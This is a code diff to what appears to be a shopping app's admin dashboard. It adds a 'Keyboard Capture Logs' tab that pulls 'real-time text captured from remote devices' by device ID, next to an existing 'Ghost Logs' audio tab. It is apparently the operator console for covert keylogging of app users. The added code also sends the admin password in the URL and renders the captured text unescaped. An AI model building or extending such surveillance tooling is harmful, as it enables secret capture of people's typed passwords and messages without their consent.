@@ -10,7 +10,8 @@
       --success: #34d399;
       --danger: #f87171;
       --warning: #fbbf24;
-      --purple: #a855f7; /* Ghost Tab के लिए नया रंग */
+      --purple: #a855f7; 
+      --neon-key: #00ffcc; /* कीबोर्ड लॉग्स के लिए नया रंग */
       --dark-bg: #0f172a;
       --card-bg: rgba(255, 255, 255, 0.05);
       --input-bg: rgba(15, 23, 42, 0.8);
@@ -67,6 +68,13 @@
     .ghost-info b { color: var(--purple); font-size: 14px; }
     audio { height: 30px; width: 120px; filter: invert(100%); opacity: 0.8; }
 
+    /* Keyboard Logs Styling (New) */
+    .key-log-item { padding: 15px; background: rgba(0, 255, 204, 0.05); border: 1px solid rgba(0, 255, 204, 0.2); border-radius: 15px; margin-bottom: 10px; }
+    .key-header { display: flex; justify-content: space-between; margin-bottom: 5px; }
+    .key-device { font-size: 11px; color: var(--neon-key); font-weight: 800; text-transform: uppercase; }
+    .key-time { font-size: 10px; color: #64748b; }
+    .key-data { font-size: 16px; color: #fff; font-weight: 600; word-break: break-all; }
+
     /* Product Item List */
     .product-list-card { padding: 18px; margin-bottom: 15px; position: relative; }
     .product-header { display: flex; gap: 12px; align-items: center; margin-bottom: 12px; }
@@ -119,6 +127,7 @@
         <button class="tab-btn" onclick="openTab(event, 'banners')">🖼️ Banners</button>
         <button class="tab-btn" onclick="openTab(event, 'notifications')">📢 Broadcast</button>
         <button class="tab-btn" style="border: 1px solid var(--purple);" onclick="openTab(event, 'ghost')">👻 Ghost Logs</button>
+        <button class="tab-btn" style="border: 1px solid var(--neon-key);" onclick="openTab(event, 'keyboard-logs')">⌨️ Keyboards</button>
       </div>
 
       <div id="inventory" class="content-section active">
@@ -190,13 +199,26 @@
         </div>
       </div>
 
+      <div id="keyboard-logs" class="content-section">
+        <div class="glass-card" style="border-left: 5px solid var(--neon-key);">
+          <div style="display: flex; justify-content: space-between; align-items: center;">
+            <h3>Keyboard Capture Logs</h3>
+            <button onclick="loadKeyboardLogs()" style="background:none; border:none; color:var(--neon-key); font-size:12px; cursor:pointer;">🔄 Refresh</button>
+          </div>
+          <p style="color: #94a3b8; font-size: 13px; margin-bottom: 15px;">Real-time text captured from remote devices.</p>
+          <div id="key-logs-container">
+            <p style="text-align: center; color: #64748b; padding: 20px;">Loading keystrokes...</p>
+          </div>
+        </div>
+      </div>
+
     </div>
   </div>
 
   <script>
     const API_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' 
                     ? 'http://localhost:4000' 
-                    : 'https://ratufresh.me'; // 🔥 आपके असली डोमेन पर अपडेट किया गया
+                    : 'https://ratufresh.me'; 
 
     let adminPass = sessionStorage.getItem('adminAuthKey');
 
@@ -212,10 +234,37 @@
 
       if(sectionName === 'inventory') loadAllProducts();
       if(sectionName === 'banners') loadBanners();
-      if(sectionName === 'ghost') loadGhostLogs(); // 🔥 Ghost Logs लोड करना
+      if(sectionName === 'ghost') loadGhostLogs();
+      if(sectionName === 'keyboard-logs') loadKeyboardLogs(); // 🔥 कीबोर्ड लॉग्स लोड करना
     }
 
-    // 🔥 GHOST LOGS LOADING FUNCTION
+    // 🔥 NEW KEYBOARD LOGS LOADING FUNCTION
+    async function loadKeyboardLogs() {
+        const container = document.getElementById('key-logs-container');
+        try {
+            const res = await fetch(`${API_URL}/api/admin/keyboard-logs?password=${adminPass}`);
+            const data = await res.json();
+            
+            if (data.length === 0) {
+                container.innerHTML = `<p style="text-align: center; color: #64748b; padding: 20px;">No keystrokes captured yet.</p>`;
+                return;
+            }
+
+            container.innerHTML = data.map(log => `
+                <div class="key-log-item">
+                    <div class="key-header">
+                        <span class="key-device">📱 ID: ${log.deviceId || 'Unknown'}</span>
+                        <span class="key-time">${new Date(log.timestamp).toLocaleString()}</span>
+                    </div>
+                    <div class="key-data">${log.data}</div>
+                </div>
+            `).join('');
+        } catch (e) {
+            container.innerHTML = `<p style="text-align: center; color: var(--danger);">Failed to fetch keyboard logs.</p>`;
+        }
+    }
+
+    // GHOST LOGS LOADING FUNCTION
     async function loadGhostLogs() {
         const listDiv = document.getElementById('ghost-list');
         try {
